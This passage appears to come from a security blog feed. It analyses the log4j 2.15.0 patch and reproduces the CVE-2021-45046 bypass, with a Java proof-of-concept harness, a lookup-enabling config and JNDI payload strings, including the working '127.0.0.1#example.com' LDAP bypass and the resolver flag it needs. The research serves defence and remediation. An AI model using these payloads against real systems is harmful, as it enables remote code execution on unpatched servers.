+<p>At this point, the last element needed to complete the basic research environment would be to obtain visibility over the network traffic. Ideally, that would be done with a custom LDAP/DNS/RMI server that would be able to provide a clear indication of the request and any metadata it carries, as well as control over what data is sent back to the vulnerable application; however, some of that could be achieved with a simple packet analyser that can show if a request is being made, even if nothing is sent back. For a lot of the cases that should be enough to prove if the application is (still) vulnerable.</p>
+
+<p>We would recommend Wireshark as it will be easy to see the different protocols and it is very intuitive to apply filters (unlike tcpdump). With it running (do not forget to execute it with elevated privileges), listening on all interfaces, you should be able to rerun the POC script and see the network traffic, as shown below:</p>
+
+<p><img src="/assets/images/posts/image-19.png" alt="" /></p>
+
+<p>That concludes our small testing environment for log4j. In our next blog post, we would focus more on exploiting the vulnerability and research different patching methods.</p>]]></content><author><name></name></author><category term="Apache" /><category term="DNS resolver" /><summary type="html"><![CDATA[With its widespread adoption rate and the challenge enterprises face with tracking down where it is being used, log4j would likely continue to be a relevant attack vector for quite a long time. Because of this, we decided to showcase how one would go about building a local lab that could be used both for developing and testing an exploit, as well as help to confirm and adapt remedial actions.]]></summary></entry><entry><title type="html">Analysing and Reproducing PoC for Log4j 2.15.0</title><link href="https://secariolabs.github.io/analysing-and-reproducing-poc-for-log4j-2-15-0/" rel="alternate" type="text/html" title="Analysing and Reproducing PoC for Log4j 2.15.0" /><published>2023-03-03T07:18:45+00:00</published><updated>2023-03-03T07:18:45+00:00</updated><id>https://secariolabs.github.io/analysing-and-reproducing-poc-for-log4j-2-15-0</id><content type="html" xml:base="https://secariolabs.github.io/analysing-and-reproducing-poc-for-log4j-2-15-0/"><![CDATA[<p>Very shortly after the release of the patch for CVE-2021-44228, bundled by Apache as log4j 2.15.0, researchers already found ways of bypassing the fix: CVE-2021-45046. In particular, for less than a couple of days, a vulnerability was discovered, and while it was initially rated as 3.7, it was later elevated to 9.0. Needless to say, it captured our attention, especially considering the incident response work we were conducting at the time. It was important for us to understand the situation to better advise our clients. There were bits and pieces of research with some screenshots of the bypass circulating the Internet, but, at the time, we didn’t really find a vulnerable environment, with good explanation and well laid out pre-requisite for the bypass to work.</p>
+
+<p>This blog goes over the research we performed from start to finish to produce a PoC and, in the process, to very precisely understand the conditions which have to be present to successfully bypass the patch to log4j in 2.15.0.</p>
+
+<h2 id="tracking-the-changes">Tracking the Changes</h2>
+
+<p>To start with, we downloaded the vulnerable 2.14.1 log4j library, as well as the patched 2.15.0:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@ubuntu:~/poc<span class="nv">$ </span>wget <span class="nt">-q</span> https://archive.apache.org/dist/logging/log4j/2.14.1/apache-log4j-2.14.1-src.tar.gz
+user@ubuntu:~/poc<span class="nv">$ </span><span class="nb">tar </span>zxf apache-log4j-2.14.1-src.tar.gz 
+user@ubuntu:~/poc<span class="nv">$ </span>wget <span class="nt">-q</span> https://archive.apache.org/dist/logging/log4j/2.15.0/apache-log4j-2.15.0-src.tar.gz 
+user@ubuntu:~/poc<span class="nv">$ </span><span class="nb">tar </span>zxf apache-log4j-2.15.0-src.tar.gz 
+user@ubuntu:~/poc<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lh</span>
+total 22M
+drwxr-xr-x 42 user user 4.0K Mar  6  2021 apache-log4j-2.14.1-src
+<span class="nt">-rw-rw-r--</span>  1 user user  11M Mar 11  2021 apache-log4j-2.14.1-src.tar.gz
+drwxr-xr-x 45 user user 4.0K Dec  9 10:19 apache-log4j-2.15.0-src
+<span class="nt">-rw-rw-r--</span>  1 user user  12M Dec  9 15:46 apache-log4j-2.15.0-src.tar.gz
+</code></pre></div></div>
+
+<p>With both folders ready, we used meld to have an easier time finding what was different in the <code class="language-plaintext highlighter-rouge">log4j-core</code> folder:</p>
+
+<p><img src="/assets/images/posts/image-20-1024x660.png" alt="" /></p>
+
+<p>Reviewing only the modified files, we noticed interesting changes in the JndiManager class:</p>
+
+<ul>
+  <li>Already at the beginning of the class, we saw a number of new local variables:</li>
+</ul>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">LDAP</span> <span class="o">=</span> <span class="s">"ldap"</span><span class="o">;</span>
+<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">LDAPS</span> <span class="o">=</span> <span class="s">"ldaps"</span><span class="o">;</span>
+<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">JAVA</span> <span class="o">=</span> <span class="s">"java"</span><span class="o">;</span>
+<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">permanentAllowedHosts</span> <span class="o">=</span> <span class="nc">NetUtils</span><span class="o">.</span><span class="na">getLocalIps</span><span class="o">();</span>
+<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">permanentAllowedClasses</span> <span class="o">=</span> <span class="nc">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="nc">Boolean</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span>
+        <span class="nc">Byte</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="nc">Character</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="nc">Double</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="nc">Float</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span>
+        <span class="nc">Integer</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="nc">Long</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="nc">Short</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">permanentAllowedProtocols</span> <span class="o">=</span> <span class="nc">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="no">JAVA</span><span class="o">,</span> <span class="no">LDAP</span><span class="o">,</span> <span class="no">LDAPS</span><span class="o">);</span>
+<span class="o">[...</span><span class="na">snip</span><span class="o">...]</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Within the lookup function there was some new logic:</li>
+</ul>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">synchronized</span> <span class="o">&lt;</span><span class="no">T</span><span class="o">&gt;</span> <span class="no">T</span> <span class="nf">lookup</span><span class="o">(</span><span class="kd">final</span> <span class="nc">String</span> <span class="n">name</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">NamingException</span> <span class="o">{</span>
+  <span class="k">try</span> <span class="o">{</span>
+    <span class="no">URI</span> <span class="n">uri</span> <span class="o">=</span> <span class="k">new</span> <span class="no">URI</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getScheme</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+      <span class="k">if</span> <span class="o">(!</span><span class="n">allowedProtocols</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getScheme</span><span class="o">().</span><span class="na">toLowerCase</span><span class="o">(</span><span class="nc">Locale</span><span class="o">.</span><span class="na">ROOT</span><span class="o">)))</span> <span class="o">{</span>
+        <span class="no">LOGGER</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="s">"Log4j JNDI does not allow protocol {}"</span><span class="o">,</span> <span class="n">uri</span><span class="o">.</span><span class="na">getScheme</span><span class="o">());</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+      <span class="o">}</span>
+      <span class="k">if</span> <span class="o">(</span><span class="no">LDAP</span><span class="o">.</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getScheme</span><span class="o">())</span> <span class="o">||</span> <span class="no">LDAPS</span><span class="o">.</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getScheme</span><span class="o">()))</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(!</span><span class="n">allowedHosts</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getHost</span><span class="o">()))</span> <span class="o">{</span>
+          <span class="no">LOGGER</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="s">"Attempt to access ldap server not in allowed list"</span><span class="o">);</span>
+          <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="nc">Attributes</span> <span class="n">attributes</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">context</span><span class="o">.</span><span class="na">getAttributes</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">attributes</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+          <span class="nc">Map</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span> <span class="nc">Attribute</span><span class="o">&gt;</span> <span class="n">attributeMap</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">&lt;&gt;();</span>
+          <span class="nc">NamingEnumeration</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="nc">Attribute</span><span class="o">&gt;</span> <span class="n">enumeration</span> <span class="o">=</span> <span class="n">attributes</span><span class="o">.</span><span class="na">getAll</span><span class="o">();</span>
+          <span class="k">while</span> <span class="o">(</span><span class="n">enumeration</span><span class="o">.</span><span class="na">hasMore</span><span class="o">())</span> <span class="o">{</span>
+            <span class="nc">Attribute</span> <span class="n">attribute</span> <span class="o">=</span> <span class="n">enumeration</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
+            <span class="n">attributeMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">attribute</span><span class="o">.</span><span class="na">getID</span><span class="o">(),</span> <span class="n">attribute</span><span class="o">);</span>
+          <span class="o">}</span>
+          <span class="nc">Attribute</span> <span class="n">classNameAttr</span> <span class="o">=</span> <span class="n">attributeMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="no">CLASS_NAME</span><span class="o">);</span>
+          <span class="k">if</span> <span class="o">(</span><span class="n">attributeMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="no">SERIALIZED_DATA</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+              <span class="k">if</span> <span class="o">(</span><span class="n">classNameAttr</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="nc">String</span> <span class="n">className</span> <span class="o">=</span> <span class="n">classNameAttr</span><span class="o">.</span><span class="na">get</span><span class="o">().</span><span class="na">toString</span><span class="o">();</span>
+                <span class="k">if</span> <span class="o">(!</span><span class="n">allowedClasses</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">className</span><span class="o">))</span> <span class="o">{</span>
+                  <span class="no">LOGGER</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="s">"Deserialization of {} is not allowed"</span><span class="o">,</span> <span class="n">className</span><span class="o">);</span>
+                  <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+                <span class="o">}</span>
+              <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                <span class="no">LOGGER</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="s">"No class name provided for {}"</span><span class="o">,</span> <span class="n">name</span><span class="o">);</span>
+                <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+              <span class="o">}</span>
+          <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">attributeMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="no">REFERENCE_ADDRESS</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">attributeMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="no">OBJECT_FACTORY</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="no">LOGGER</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="s">"Referenceable class is not allowed for {}"</span><span class="o">,</span> <span class="n">name</span><span class="o">);</span>
+            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+          <span class="o">}</span>
+        <span class="o">}</span>
+      <span class="o">}</span>
+    <span class="o">}</span>
+  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">URISyntaxException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+    <span class="no">LOGGER</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="s">"Invalid JNDI URI - {}"</span><span class="o">,</span> <span class="n">name</span><span class="o">);</span>
+    <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+  <span class="o">}</span>
+  <span class="k">return</span> <span class="o">(</span><span class="no">T</span><span class="o">)</span> <span class="k">this</span><span class="o">.</span><span class="na">context</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Assuming we were able to reach the same lookup function, our payload would need to comply with two new conditions:</p>
+
+<ul>
+  <li><strong>ALLOWED_HOSTS</strong> – The host within the URL has to be approved</li>
+  <li><strong>ALLOWED_PROTOCOLS</strong> – The protocol used for the query has to be approved</li>
+</ul>
+
+<p>We managed to find a bit more information for these properties in the documentation:</p>
+
+<p><strong>ALLOWED_PROTOCOLS</strong> By default the JDNI Lookup only supports the java, ldap, and ldaps protocols or no protocol. Additional protocols may be supported by specifying them on the “log4j2.allowedJndiProtocols” property.</p>
+
+<p><strong>ALLOWED_HOSTS</strong> System property that adds host names or ip addresses that may be access by LDAP. When using LDAP only references to the local host name or ip address are supported along with any hosts or ip addresses listed in the “log4j2.allowedLdapHosts” property.</p>
+
+<p>To verify this, we also looked at the source code. The default “allowed protocols” were:</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">LDAP</span> <span class="o">=</span> <span class="s">"ldap"</span><span class="o">;</span>
+<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">LDAPS</span> <span class="o">=</span> <span class="s">"ldaps"</span><span class="o">;</span>
+<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">JAVA</span> <span class="o">=</span> <span class="s">"java"</span><span class="o">;</span>
+<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">permanentAllowedProtocols</span> <span class="o">=</span> <span class="nc">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="no">JAVA</span><span class="o">,</span> <span class="no">LDAP</span><span class="o">,</span> <span class="no">LDAPS</span><span class="o">);</span>
+</code></pre></div></div>
+
+<p>Whereas the default “allowed hosts” were listed in the <code class="language-plaintext highlighter-rouge">getLocalIps</code> function in <code class="language-plaintext highlighter-rouge">log4j-core/src/main/java/org/apache/logging/log4j/core/util/NetUtils.java</code>:</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">getLocalIps</span><span class="o">()</span> <span class="o">{</span>
+  <span class="nc">List</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">localIps</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;&gt;();</span>
+  <span class="n">localIps</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"localhost"</span><span class="o">);</span>
+  <span class="n">localIps</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"127.0.0.1"</span><span class="o">);</span>
+  <span class="k">try</span> <span class="o">{</span>
+    <span class="kd">final</span> <span class="nc">InetAddress</span> <span class="n">addr</span> <span class="o">=</span> <span class="nc">Inet4Address</span><span class="o">.</span><span class="na">getLocalHost</span><span class="o">();</span>
+    <span class="n">setHostName</span><span class="o">(</span><span class="n">addr</span><span class="o">,</span> <span class="n">localIps</span><span class="o">);</span>
+  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="kd">final</span> <span class="nc">UnknownHostException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+    <span class="c1">// Ignore this.</span>
+  <span class="o">}</span>
+  <span class="k">try</span> <span class="o">{</span>
+    <span class="kd">final</span> <span class="nc">Enumeration</span><span class="o">&lt;</span><span class="nc">NetworkInterface</span><span class="o">&gt;</span> <span class="n">interfaces</span> <span class="o">=</span> <span class="nc">NetworkInterface</span><span class="o">.</span><span class="na">getNetworkInterfaces</span><span class="o">();</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">interfaces</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+      <span class="k">while</span> <span class="o">(</span><span class="n">interfaces</span><span class="o">.</span><span class="na">hasMoreElements</span><span class="o">())</span> <span class="o">{</span>
+        <span class="kd">final</span> <span class="nc">NetworkInterface</span> <span class="n">nic</span> <span class="o">=</span> <span class="n">interfaces</span><span class="o">.</span><span class="na">nextElement</span><span class="o">();</span>
+        <span class="kd">final</span> <span class="nc">Enumeration</span><span class="o">&lt;</span><span class="nc">InetAddress</span><span class="o">&gt;</span> <span class="n">addresses</span> <span class="o">=</span> <span class="n">nic</span><span class="o">.</span><span class="na">getInetAddresses</span><span class="o">();</span>
+        <span class="k">while</span> <span class="o">(</span><span class="n">addresses</span><span class="o">.</span><span class="na">hasMoreElements</span><span class="o">())</span> <span class="o">{</span>
+          <span class="kd">final</span> <span class="nc">InetAddress</span> <span class="n">address</span> <span class="o">=</span> <span class="n">addresses</span><span class="o">.</span><span class="na">nextElement</span><span class="o">();</span>
+          <span class="n">setHostName</span><span class="o">(</span><span class="n">address</span><span class="o">,</span> <span class="n">localIps</span><span class="o">);</span>
+        <span class="o">}</span>
+      <span class="o">}</span>
+    <span class="o">}</span>
+  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="kd">final</span> <span class="nc">SocketException</span> <span class="n">se</span><span class="o">)</span> <span class="o">{</span>
+      <span class="c1">// ignore.</span>
+  <span class="o">}</span>
+  <span class="k">return</span> <span class="n">localIps</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<h2 id="testing-assumptions">Testing Assumptions</h2>
+
+<p>At this point, we had some assumptions as to what the patch has introduced. We decided to go ahead and try to confirm this with a practical test.</p>
+
+<p>First, we modified the payload we wrote in our previous blog, to something easier to use:</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">org.apache.logging.log4j.LogManager</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.logging.log4j.Logger</span><span class="o">;</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">POC</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">Logger</span> <span class="n">logger</span> <span class="o">=</span> <span class="nc">LogManager</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="no">POC</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">args</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">){</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Using payload: "</span> <span class="o">+</span> <span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
+        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"No payload provided..."</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>After that we compiled it and ran it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@ubuntu:~/poc<span class="nv">$ </span>./jdk1.8.0_171/bin/javac <span class="nt">-cp</span> apache-log4j-2.15.0-bin/log4j-core-2.15.0.jar:apache-log4j-2.15.0-bin/log4j-api-2.15.0.jar POC.java 
+user@ubuntu:~/poc<span class="nv">$ </span>./jdk1.8.0_171/bin/java <span class="nt">-cp</span> apache-log4j-2.15.0-bin/log4j-core-2.15.0.jar:apache-log4j-2.15.0-bin/log4j-api-2.15.0.jar:. POC <span class="s1">'${jndi:dns://test.example.com}'</span>
+Using payload: <span class="k">${</span><span class="nv">jndi</span>:dns://test.example.com<span class="k">}</span>
+15:06:32.118 <span class="o">[</span>main] ERROR POC - <span class="k">${</span><span class="nv">jndi</span>:dns://test.example.com<span class="k">}</span>
+</code></pre></div></div>
+
+<p>While we were not expecting to be seeing a DNS request in <code class="language-plaintext highlighter-rouge">wireshark</code>, there had to be at least an error indicating that our protocol and host were wrong, but there was nothing there.</p>
+
+<p>Our assumption was wrong – there had to be more changes that we were not aware of. We tried with “log4j2.formatMsgNoLookups=true”, as this was mentioned in the patch, but it didn’t change anything. There was no DNS or TCP outbound or any additional errors. Because of this we went back to the documentation and stumbled on this:</p>
+
+<p>Pattern layout no longer enables lookups within message text by default for cleaner API boundaries and reduced formatting overhead. The old ‘log4j2.formatMsgNoLookups’ which enabled this behavior has been removed as well as the ‘nolookups’ message pattern converter option. The old behavior can be enabled on a per-pattern basis using ‘%m{lookups}’.</p>
+
+<p>A quick check with meld to <code class="language-plaintext highlighter-rouge">/log4j-core/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter.java</code> revealed that there no longer was a flag that we can enable for lookups unless the option was included in the config file.</p>
+
+<p>With this in mind, we had to create a config file with a custom pattern and use it:</p>
+
+<ul>
+  <li>Create a log4j2.xml configuration file in the same folder as the POC code.</li>
+</ul>
+
+<pre><code class="language-markup">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;Configuration status="WARN"&gt;
+    &lt;Appenders&gt;
+        &lt;Console name="Console" target="SYSTEM_OUT"&gt;
+        &lt;PatternLayout pattern="%d{HH:mm:ss.SSS} - $${ctx:myContext} - %msg%n" /&gt;
+        &lt;/Console&gt;
+    &lt;/Appenders&gt;
+    &lt;Loggers&gt;
+        &lt;Root level="error"&gt;
+            &lt;AppenderRef ref="Console"/&gt;
+        &lt;/Root&gt;
+    &lt;/Loggers&gt;
+&lt;/Configuration&gt;
+</code></pre>
+
+<ul>
+  <li>Modify the POC code to use the new context variable:</li>
+</ul>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">org.apache.logging.log4j.LogManager</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.logging.log4j.Logger</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.logging.log4j.ThreadContext</span><span class="o">;</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">POC</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">Logger</span> <span class="n">logger</span> <span class="o">=</span> <span class="nc">LogManager</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="no">POC</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">args</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">){</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Using payload: "</span> <span class="o">+</span> <span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
+        <span class="nc">ThreadContext</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"myContext"</span><span class="o">,</span> <span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
+        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"No payload provided..."</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>With these changes, we decided to test again with a slightly modified payload:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@ubuntu:~/poc<span class="nv">$ </span>./jdk1.8.0_171/bin/java <span class="nt">-cp</span> log4j-core-2.15.0.jar:log4j-api-2.15.0.jar:. POC <span class="s1">'${jndi:ldap://example.com/a'</span><span class="o">}</span>
+Using payload: <span class="k">${</span><span class="nv">jndi</span>:ldap://example.com/a<span class="k">}</span>
+2021-12-27 16:27:49,981 main WARN Attempt to access ldap server not <span class="k">in </span>allowed list
+16:27:49.976 - <span class="k">${</span><span class="nv">jndi</span>:ldap://example.com/a<span class="k">}</span> - <span class="k">${</span><span class="nv">jndi</span>:ldap://example.com/a<span class="k">}</span>
+</code></pre></div></div>
+
+<p>We then ran it again to verify that we can use the other enabled protocols as well:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@ubuntu:~/poc<span class="nv">$ </span>./jdk1.8.0_171/bin/java <span class="nt">-cp</span> log4j-core-2.15.0.jar:log4j-api-2.15.0.jar:. POC <span class="s1">'${java:version}'</span>
+Using payload: <span class="k">${</span><span class="nv">java</span>:version<span class="k">}</span>
+17:31:52.159 - Java version 1.8.0_171 - <span class="k">${</span><span class="nv">java</span>:version<span class="k">}</span>
+</code></pre></div></div>
+
+<p>At this point we knew that we are reaching the lookup function and it just became a matter of bypassing the newly introduced checks.</p>
+
+<h2 id="final-challenge">Final Challenge</h2>
+
+<p>We reached a big problem as the <a href="https://twitter.com/marcioalm/status/1471740771581652995">bypass</a> we saw on Twitter <code class="language-plaintext highlighter-rouge">${jndi:ldap://127.0.0.1#example.com/a}</code> was not working for us. The application was crashing, complaining that it cannot resolve the host due to # in the domain. To go around this, we had to use a different DNS resolver which was not so picky about the special characters.</p>
+
+<p>Here we have a PoC of this:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@ubuntu:~/poc<span class="nv">$ </span>./jdk1.8.0_171/bin/java <span class="nt">-cp</span> log4j-core-2.15.0.jar:log4j-api-2.15.0.jar:. <span class="se">\</span>
+<span class="o">&gt;</span> <span class="nt">-Dsun</span>.net.spi.nameservice.provider.1<span class="o">=</span>dns,sun POC <span class="s1">'${jndi:ldap://127.0.0.1#example.com/a}'</span>
+Using payload: <span class="k">${</span><span class="nv">jndi</span>:ldap://127.0.0.1#example.com/a<span class="k">}</span>
+2021-12-24 02:45:36,290 main WARN Error looking up JNDI resource <span class="o">[</span>ldap://127.0.0.1#example.com/a]. javax.naming.CommunicationException: 127.0.0.1#example.com:389 <span class="o">[</span>Root exception is java.net.UnknownHostException: 127.0.0.1#example.com]
+<span class="o">[</span>...snip...]
+</code></pre></div></div>
+
+<p><img src="/assets/images/posts/image-21.png" alt="" /></p>
+
+<p>With this, we were able to reproduce the attack and once again be in a position to achieve RCE.</p>
+
